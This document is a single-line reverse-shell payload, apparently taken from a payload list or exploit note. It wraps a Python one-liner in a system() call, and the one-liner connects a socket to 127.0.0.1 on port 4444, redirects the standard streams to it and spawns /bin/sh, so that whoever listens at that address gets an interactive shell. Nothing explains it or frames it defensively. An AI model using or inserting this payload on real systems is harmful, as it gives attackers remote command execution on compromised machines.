<pre>system("python -c 'import sys, socket, os, pty; _= sys.argv; ip = \"127.0.0.1\"; port = 4444; s = socket.socket(); s.connect((ip, int(port))); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(\"/bin/sh\")'")</pre>